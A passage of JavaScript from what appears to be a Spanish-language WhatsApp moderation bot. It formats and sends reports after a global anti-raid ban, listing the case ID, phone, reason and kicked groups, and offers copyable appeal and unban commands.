        adminName: rec.adminName,
        dateStr: rec.dateStr,
        extraLabel: "Grupos Expulsado",
        extraValue: `${kickedGroups} grupo(s)`,
        footerNote: `La identidad del denunciante es estrictamente confidencial. Si tienes pruebas de que fue un reporte falso, escribe ${px}appeal seguido de tu descargo.`,
        copyCommand: `${px}appeal Solicito revisión del caso #${rec.caseId}: `,
        copyLabel: "⚖️ Copiar .appeal",
        rawSummary: dt,
      });
    }

    const rpt = [
      `╭〔 🛡️ ${_fb("EJECUCIÓN SQL ANTI-RAID")} 〕⬣`,
      `┃ 🆔 *Caso SQL:* \`#${rec.caseId}\``,
      `┃ 🎯 *Número:* ${rec.phone.startsWith("LID_") ? "Oculto (Baneo por LID)" : `+${rec.phone}`}`,
      `┃ 🔗 *LID:* \`${rec.lid || "Auto-detectable al entrar"}\``,
      `┃ 📋 *Motivo:* ${rec.reason}`,
      `┃ 👮 *Ejecutor:* ${rec.adminName}`,
      `┃ 🏰 *Expulsado de:* ${kickedGroups} grupo(s) en vivo`,
      ...(warnedGroups > 0 ? [`┃ ⚠️ *Alertados (sin admin):* ${warnedGroups} grupo(s)`] : []),
      `┃ 📩 *Notificación DM:* Enviada con opción a \`.appeal\``,
      `╰━━〔 ⚡ ${_fb("AURA REED SQL")} 〕━━⬣`,
    ].join("\n");

    await _srf(sock, from, `🛡️ BANEO SQL EJECUTADO // #${rec.caseId}`, `Expulsado de ${kickedGroups} grupo(s) • Alertados: ${warnedGroups}`, {
      mode: "GLOBAL_REPORT",
      badgeText: "OBJETIVO REGISTRADO EN SQL",
      title: "Acta de Baneo Global",
      subtitle: "AURA REED ANTI-RAID SQL",
      caseId: rec.caseId,
      targetPhone: rec.phone,
      targetLid: rec.lid,
      reason: rec.reason,
      adminName: rec.adminName,
      dateStr: rec.dateStr,
      extraLabel: "Red Procesada",
      extraValue: `${kickedGroups} kick / ${warnedGroups} warn`,
      footerNote: "El usuario quedó bloqueado de todos los comandos y grupos en SQLite + espejo en disco. Donde el bot no sea admin se envió alerta al grupo.",
      copyCommand: `${px}ungban ${rec.caseId}`,
      copyLabel: "🔓 Copiar .ungban",
      rawSummary: rpt,
    });

    await react("✅").catch(() => undefined);
  },
};
